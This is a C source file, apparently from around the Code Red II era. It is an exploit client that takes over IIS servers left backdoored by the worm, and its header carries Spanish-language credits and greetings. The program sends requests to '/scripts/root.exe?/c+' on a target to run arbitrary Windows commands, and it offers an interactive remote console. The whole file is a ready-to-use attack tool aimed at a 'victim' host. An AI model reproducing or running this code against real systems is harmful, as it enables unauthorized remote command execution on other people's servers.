
/*
IIS-ZANG.C reformado para explotar el backdoor que habre el worm del 
code red II 

IIS-ZANG.C source based exploit-client ;) for the codered 2 worm backdoor  

by ][-][UNTER @ Infobyte, Digital Security Research 

mail: lopht@tutopia.com 

greetz: Shiff, |YODA|, ANDYPZS, Powertech , QQmelo,  Polos , ca0s , giba, 
phreacking ^dr_fdisk , netgod ,la novia de ca0s y la hermana de powertech ,
mm... a Delfina mi sobrinita linda , a eZe ke ya ta re grande el pendex , 
a kevinmitnick y a pepe crak0r ;) . #linux @ ciudad y a todos 
los pungas de #merlo 

PD: mama estoy en un exploit soy un mal0r super elit0r ( bah.. ) 

cya ppl 

Un fuerte abraso a toda la gente que recien se inicia en este mundo tan under
y pseudo estupido, nunca den marcha a atras

*/
#include <stdio.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
//#include <signal.h>
#include <errno.h>
#include <fcntl.h>

void usage(void) 
{
 fprintf(stderr, "uso: ./codered2 <-t victima > <-c 'comando' or -i 'consola' >"); 
 fprintf(stderr, " [-p port] [-t timeout]\n"); 
 exit(-1);
}

int main(int argc, char **argv) 
{
 int i, j;
 int port=80;
 int timeout=3;
 int interactive=0;
 char temp[1];
 char host[512]=""; 
 char cmd[1024]="";
 char request[8192]="GET /scripts/root.exe?/c+";
 struct hostent *he;
 struct sockaddr_in s_addr;

 printf("iis-zang hax0read0 para el codered 2\n");
 printf("by ][-][UNTER de Infobyte Security Research\n");

 for(i=0;i<argc;i++) 
	{ if(argv[i][0] == '-') {
		 for(j=1;j<strlen(argv[i]);j++) 
		 	{
			 switch(argv[i][j]) 
			 	{
				 case 't':
				 	strncpy(host, argv[i+1], sizeof(host));
				 	break;
				 case 'c':
				 	strncpy(cmd, argv[i+1], sizeof(cmd));
				 	break;
				 case 'h':
				 	usage();
			 	 	break;
				 case 'o':
					timeout=atoi(argv[i+1]); 
				 	break;
				 case 'p':
				 	port=atoi(argv[i+1]);
				 	break;
				 case 'i':
				 	interactive=1;
				 	break;
				 default:
				 break;
				}
			}
		}
	}

 if(!strcmp(host, "")) 
	{
	 fprintf(stderr, "pone el ip del serv0\n");
	 usage();
	}

 if(!strcmp(cmd, "") && !interactive) 
	{
	 fprintf(stderr, "specify command to execute\n");
	 usage();
	}

 printf("]- Target - %s:%d\n", host, port);
 if(!interactive)
 	 printf("]- comando - %s\n", cmd);
 printf("]- Timeout - %d segundos\n", timeout);
 if((he=gethostbyname(host)) == NULL) 
	{
 	 fprintf(stderr, "invalid target\n");
	 usage();
	}

 do
 	{

	 if(interactive)
	 	 {
		  cmd[0]=0;
		  printf("\nC> ");
		  if(fgets(cmd, sizeof(cmd), stdin) == NULL)
		  	  fprintf(stderr, "gets() error\n"); 
		  cmd[strlen(cmd)-1]='\0';
		  if(!strcmp("exit", cmd))
		  	  exit(-1);
		 }

 	 for(i=0;i<strlen(cmd);i++) 
		 {
	 	  if(cmd[i]==' ')
		  	cmd[i]='+';
		 }

	 strncpy(request, 
		   "GET /scripts/root.exe?/c+",
		   sizeof(request));
 	 strncat(request, cmd, sizeof(request) - strlen(request));	
 	 strncat(request, "\n", sizeof(request) - strlen(request));

 	 s_addr.sin_family = PF_INET;
 	 s_addr.sin_port = htons(port);
 	 memcpy((char *) &s_addr.sin_addr, (char *) he->h_addr, 
 		sizeof(s_addr.sin_addr));	

 	 if((i=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) 
		 {
	 	  fprintf(stderr, "cannot create socket\n");
	 	  exit(-1);
		 }

 	 alarm(timeout);
 	 j = connect(i, (struct sockaddr *) &s_addr, sizeof(s_addr));
 	 alarm(0);

 	 if(j==-1) 
		 {
	 	  fprintf(stderr, "sorry no pude conectarme a %s\n", host);
	 	  exit(-1);
	 	  close(i);
		 }

	 if(!interactive)
 	 	  printf("]- atacando: %s\n", request);

 	 send(i, request, strlen(request), 0);

	 if(!interactive)
 	 	  printf("]- mm...\n");

 	 while(recv(i,temp,1, 0)>0) 
		 {
         	  alarm(timeout);
	 	  printf("%c", temp[0]);
         	  alarm(0);
		 }	

  }
  while(interactive);

  close(i);	
  return 0;
}
/*          Infobyte, Digital Security Research      */
